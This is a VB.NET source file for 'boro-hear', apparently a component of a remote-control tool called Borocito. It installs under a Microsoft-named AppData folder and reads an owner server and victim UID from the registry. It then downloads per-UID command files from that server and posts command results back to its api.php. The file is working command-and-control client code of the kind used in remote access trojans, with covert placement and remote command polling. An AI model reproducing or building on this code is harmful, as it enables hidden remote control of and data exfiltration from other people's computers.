﻿Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Imports System.Net
Imports System.IO
Module Utility
    Public tlmContent As String
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRHome & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRHome & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
    Public compileVersion As String = My.Application.Info.Version.ToString &
        " (" & Application.ProductVersion & ") " &
        "[14/04/2023 20:56]" 'Indicacion exacta de la ultima compilacion

    Public HttpOwnerServer As String
    Public UID As String

    Public sendStatus As Boolean = True
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", My.Application.Info.AssemblyName & " " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Try
            CommonActions()
            LoadRegedit()
            'Boro_Comm.Connector.ConnectorManager()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommonActions()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
            If Not My.Computer.FileSystem.DirectoryExists(DIRHome) Then
                My.Computer.FileSystem.CreateDirectory(DIRHome)
            End If
        Catch ex As Exception
            AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            AddToLog("LoadRegedit@Memory", "Loading data...", False)
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            HttpOwnerServer = regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
            RegisterInstance()
        Catch ex As Exception
            AddToLog("LoadRegedit@StartUp", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Sub RegisterInstance()
        Try
            Dim llaveReg As String = "SOFTWARE\\Borocito\\boro-get\\" & My.Application.Info.AssemblyName
            Dim registerKey As RegistryKey = Registry.CurrentUser.OpenSubKey(llaveReg, True)
            If registerKey IsNot Nothing Then
                registerKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
            End If
        Catch ex As Exception
            AddToLog("RegisterInstance@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module ResponseAdministrator
    Public messageQueue As New ArrayList

    'En desarrollo
    Sub AddMessageToQueue(ByVal message As String)
        Try
            messageQueue.Add(message)
            ProcessMessageQueue()
        Catch ex As Exception
            AddToLog("AddMessageToQueue@server_CONNECT", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ProcessMessageQueue()
        Try
            For Each item As String In messageQueue
                SendToServer(item)
            Next
        Catch ex As Exception
            AddToLog("ProcessMessageQueue@server_CONNECT", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub SendToServer(ByVal message As String)
        Try
            Try
                Boro_Comm.Connector.ENVIAR(message)
            Catch
            End Try
            Threading.Thread.Sleep(5000) '5 sec para evitar solapados
            If sendStatus Then
                AddToLog("Network", "Processing: " & message, False)
                'Obtener comando actual (evita interferir)
                Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                Dim localCommandFile As String = DIRHome & "\actualCommand.str"
                If My.Computer.FileSystem.FileExists(localCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(localCommandFile)
                End If
                My.Computer.Network.DownloadFile(remoteCommandFile, localCommandFile)
                Dim lineas = IO.File.ReadAllLines(localCommandFile)
                'Prepara el mensaje
                'Header format
                '   #|cli_nickname|UID|response_date
                Dim postData As String = "#|BORO-HEAR|" & UID & "|" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") &
                    vbCrLf & "Command1>" & lineas(1).Split(">"c)(1).Trim() &
                    vbCrLf & "Command2>" & lineas(2).Split(">"c)(1).Trim() &
                    vbCrLf & "Command3>" & lineas(3).Split(">"c)(1).Trim() &
                    vbCrLf & "[Response]" &
                    vbCrLf & message
                SendAPIRequest(postData)
            Else
                AddToLog("SendToServer@ResponseAdministrator", "boro-hear paused. Can't process: " & message, False)
            End If
        Catch ex As Exception
            AddToLog("SendToServer@ResponseAdministrator", "Error: " & ex.Message, True)
        End Try
    End Sub

    Function SendAPIRequest(ByVal content As String) As Boolean
        Try
            'AddToLog("Network", "Sending API Request...", False)

            Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
            content = content.Replace("&", "{ampersand}")
            content = content.Replace("?", "{questionmark}")
            Dim postData As String = "content=" & content
            request.ContentType = "application/x-www-form-urlencoded"
            request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
            request.Method = "POST"
            request.Headers("Ident") = UID
            request.Headers("Clase") = "COMMAND"

            Dim dataStream As New StreamWriter(request.GetRequestStream())
            dataStream.Write(postData)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("Network", "Response: " & CType(response, HttpWebResponse).StatusCode & " " & CType(response, HttpWebResponse).StatusDescription, False)
            response.Close()

            Return True
        Catch ex As Exception
            AddToLog("SendAPIRequest@ResponseAdministrator", "Error: " & ex.Message, True)
            Return False
        End Try
    End Function
End Module
'Si ya hay un mensaje BORO-HEAR en el fichero de comando, entonces deberia escribirse en la siguiente linea.